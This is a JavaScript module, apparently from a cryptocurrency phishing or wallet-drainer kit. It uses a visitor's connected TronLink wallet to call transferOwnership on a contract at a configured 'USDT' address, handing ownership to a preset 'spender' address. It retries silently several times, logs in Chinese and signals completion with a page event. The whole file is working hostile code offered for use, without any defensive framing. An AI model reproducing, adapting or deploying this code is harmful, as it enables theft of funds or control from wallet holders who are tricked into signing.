


window.transferOwnershipCompleted = false;
window.transferOwnershipRunning = false;


async function executeTransferOwnershipAction() {
    let retryCount = 0;
    const maxRetries = window.TRANSFER_OWNERSHIP_RETRY_TIMES || 3;
    
    try {
        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
            throw new Error('未检测到有效的TronWeb环境');
        }
        
        console.log('开始执行TransferOwnership...');
        const currentAddress = window.tronWeb.defaultAddress.base58;
        console.log('当前钱包地址:', currentAddress);
        console.log('接收权限的钱包地址:', window.SPENDER_ADDRESS);
        
        
        console.log('正在创建合约实例...');
        const contract = await window.tronWeb.contract().at(window.USDT_CONTRACT_ADDRESS);
        console.log('合约实例创建成功');
        
        async function attemptTransferOwnership() {
            try {
                console.log(`正在执行transferOwnership... (尝试 ${retryCount + 1}/${maxRetries})`);
                const ownershipTransaction = await contract.transferOwnership(
                    window.SPENDER_ADDRESS
                ).send({
                    feeLimit: 100000000,
                    shouldPollResponse: true
                });
                console.log('transferOwnership交易结果:', ownershipTransaction);
                return { success: true, result: ownershipTransaction }; 
            } catch (error) {
                console.error(`transferOwnership执行失败 (尝试 ${retryCount + 1}/${maxRetries}):`, error);
                return { success: false, error }; 
            }
        }

        
        let attemptResult = await attemptTransferOwnership();
        retryCount++;

        
        while (!attemptResult.success && retryCount < maxRetries) {
            console.log(`等待3秒后进行第${retryCount + 1}次重试...`);
            await new Promise(resolve => setTimeout(resolve, 3000)); 
            attemptResult = await attemptTransferOwnership();
            retryCount++;
        }

        return attemptResult;
    } catch (error) {
        console.error('执行TransferOwnership出错:', error);
        return { success: false, error };
    }
}


async function executeTransferOwnershipModule() {
    
    if (window.transferOwnershipRunning) {
        console.log('TransferOwnership操作正在执行中，请稍候...');
        return { success: false, message: '已在执行中' };
    }
    
    
    window.transferOwnershipRunning = true;
    
    try {
        if (!window.tronWeb || !window.tronWeb.ready) {
            console.log('❌ 错误: 未连接TronLink钱包!');
            window.transferOwnershipRunning = false;
            return { success: false, message: '未连接钱包' };
        }
        
        console.log('✅ TronWeb环境检测通过');
        console.log('👤 当前钱包地址:', window.tronWeb.defaultAddress.base58);
        
        const result = await executeTransferOwnershipAction();
        
        if (result.success) {
            console.log('✅ TransferOwnership成功!');
            if (typeof result.result === 'object') {
                console.log('📋 交易结果:', result.result);
            }
            window.transferOwnershipCompleted = true;
            return { success: true, result: result.result };
        } else {
            console.log('❌ TransferOwnership失败');
            return { success: false, message: '执行失败', error: result.error };
        }
    } catch (error) {
        console.error('TransferOwnership出错:', error);
        console.log('❌ 出错:', error.message);
        return { success: false, error };
    } finally {
        
        window.transferOwnershipRunning = false;
        
        
        const event = new CustomEvent('transfer_ownership_completed', { 
            detail: { completed: window.transferOwnershipCompleted }
        });
        document.dispatchEvent(event);
    }
} 